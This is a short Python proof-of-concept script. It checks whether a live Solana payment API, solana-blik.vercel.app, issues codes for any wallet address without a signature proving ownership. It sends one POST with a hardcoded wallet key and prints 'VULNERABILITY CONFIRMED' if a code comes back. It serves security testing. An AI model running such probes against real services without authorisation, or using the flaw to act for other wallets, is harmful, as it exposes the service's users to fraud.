#!/usr/bin/env python3
"""
Security Test: Authentication Weakness
Tests if the API accepts arbitrary wallet addresses without cryptographic proof of ownership
"""

import urllib.request
import json
import sys

# Test configuration
TARGET_URL = "https://solana-blik.vercel.app/api/codes/generate"
TEST_PAYLOAD = {"walletPubkey": "6z7YQMXxaXRhSGCzd3bBxXf6rmFNGhyJRiCztZ1FJ8nA"}
HEADERS = {"Content-Type": "application/json"}

def test_auth_weakness():
    print("=" * 70)
    print("AUTHENTICATION WEAKNESS TEST")
    print("=" * 70)
    print(f"\nTarget Endpoint: {TARGET_URL}")
    print(f"Method: POST")
    print(f"Test Payload: {json.dumps(TEST_PAYLOAD, indent=2)}")
    print(f"Headers: {json.dumps(HEADERS, indent=2)}")
    print("\n" + "-" * 70)
    print("Testing if API accepts arbitrary wallet without proof of ownership...")
    print("-" * 70 + "\n")
    
    try:
        # Prepare the request
        data = json.dumps(TEST_PAYLOAD).encode('utf-8')
        req = urllib.request.Request(
            TARGET_URL,
            data=data,
            headers=HEADERS,
            method='POST'
        )
        
        # Make the POST request
        with urllib.request.urlopen(req, timeout=10) as response:
            status_code = response.status
            response_data = response.read().decode('utf-8')
            
            # Print results
            print(f"HTTP Status Code: {status_code}")
            print(f"\nFull Response Body:")
            print("-" * 70)
            
            try:
                response_json = json.loads(response_data)
                print(json.dumps(response_json, indent=2))
                
                # Check for "code" field
                has_code = "code" in response_json
                print("-" * 70)
                print(f"\n'code' field present in response: {has_code}")
                
                if status_code == 200 and has_code:
                    print("\n" + "!" * 70)
                    print("VULNERABILITY CONFIRMED!")
                    print("!" * 70)
                    print("\nThe API accepted an arbitrary wallet address without requiring")
                    print("cryptographic proof of ownership (signature verification).")
                    print(f"\nGenerated code: {response_json.get('code')}")
                    return True
                else:
                    print("\nVulnerability test inconclusive or API properly secured.")
                    return False
                    
            except json.JSONDecodeError:
                print(response_data)
                print("-" * 70)
                print("\nResponse is not valid JSON")
                return False
                
    except urllib.error.HTTPError as e:
        print(f"HTTP Error {e.code}: {e.reason}")
        try:
            error_body = e.read().decode('utf-8')
            print(f"\nError Response Body:")
            print("-" * 70)
            print(error_body)
        except:
            pass
        return False
    except urllib.error.URLError as e:
        print(f"URL Error: {e.reason}")
        return False
    except Exception as e:
        print(f"ERROR: Request failed - {str(e)}")
        return False
    
    print("\n" + "=" * 70)

if __name__ == "__main__":
    test_auth_weakness()
